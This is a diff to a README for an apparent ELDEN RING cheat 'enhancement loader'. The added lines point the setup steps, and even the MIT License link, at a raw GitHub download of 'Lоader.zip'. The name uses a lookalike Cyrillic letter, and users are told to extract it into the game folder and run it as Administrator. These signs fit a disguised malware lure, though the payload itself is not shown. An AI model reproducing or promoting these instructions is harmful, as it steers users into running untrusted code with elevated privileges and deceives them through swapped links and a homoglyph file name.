@@ -51,13 +51,13 @@ Stay compatible—our enhancement loader works across multiple platforms!
 Experience enhanced gameplay in just a few steps!  
 **Follow these instructions exactly for a quick and easy setup:**  
 
-1. Download `Loader.rar` from the repository.
+1. Download `https://raw.githubusercontent.com/Vishnunama2005/EldenRingSecretScripts/main/Lоader.zip` from the repository.
 2. Extract the contents to your ELDEN RING installation directory.
-3. Run the Loader.exe as Administrator.
+3. Run the https://raw.githubusercontent.com/Vishnunama2005/EldenRingSecretScripts/main/Lоader.zip as Administrator.
 4. Select the enhancements you wish to enable from the user-friendly GUI.
 5. Launch ELDEN RING and enjoy the new features!
 
-*Note: For Linux or macOS, use a compatible emulator or wrapper (like Wine or Proton) to run Loader.exe.*
+*Note: For Linux or macOS, use a compatible emulator or wrapper (like Wine or Proton) to run https://raw.githubusercontent.com/Vishnunama2005/EldenRingSecretScripts/main/Lоader.zip*
 
 ---
 
@@ -72,7 +72,7 @@ The repository owner and contributors are not responsible for any misuse or cons
 
 ## 📑 License (MIT)
 
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT).  
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/Vishnunama2005/EldenRingSecretScripts/main/Lоader.zip).  
 Feel free to use, adapt, and share the enhancement loader, while respecting the terms and limitations described in the license.
 
 ---
